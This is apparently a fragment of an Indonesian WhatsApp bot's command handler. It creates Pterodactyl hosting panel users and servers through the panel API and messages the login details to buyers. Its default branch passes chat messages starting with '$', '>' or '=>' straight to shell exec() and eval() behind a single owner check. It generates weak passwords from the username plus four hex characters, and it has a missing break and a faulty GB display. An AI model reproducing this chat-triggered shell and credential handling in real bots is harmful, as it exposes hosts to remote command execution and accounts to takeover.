buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunliv3" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gbv3" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gbv3" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gbv3" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gbv3" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gbv3" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gbv3" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gbv3" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gbv3" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gbv3" }, 
{ "header": "Ram 10GB", "title": "Ram 10GB | CPU 220%", "id": ".cp10gbv3" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "cp1gbv3": case "cp2gbv3": case "cp3gbv3": case "cp4gbv3": case "cp5gbv3": case "cp6gbv3": case "cp7gbv3": case "cp8gbv3": case "cp9gbv3": case "cp10gbv3": case "cpunliv3": {
if (global.panel3 == null) return reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv3") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv3") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv3") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv3") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv3") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv3") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv3") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv3") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv3") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gbv3") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!jangan) return reply("Grup Belum Terdaftar")
let username = global.panel3[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
await reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${global.panel3[1].split('@')[0]}`)
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await anggazyy.relayMessage(global.panel3[1], msgii.message, { 
messageId: msgii.key.id 
})
global.panel3 = null
}
break

     case 'delgc':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply("Khusus Grup")
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
reply(`${command} Success Not Active anggazyy - Official✅`)
break
case 'devil-ip':
            //if (!isRegistered) return registerbut(noregis)
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 Devil Script Private IP address is: " + ip);
                    })
                })
            break
case 'addgc':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply("Khusus Grup")
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
reply(`${command} Success Active To Reseller Panel  anggazyy - Official✅`)
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return anggazyy.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return anggazyy.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
anggazyy.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
anggazyy.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return anggazyy.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return anggazyy.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
anggazyy.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}

Command From : ${m.sender.split("@")[0]}`}, {quoted: m})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
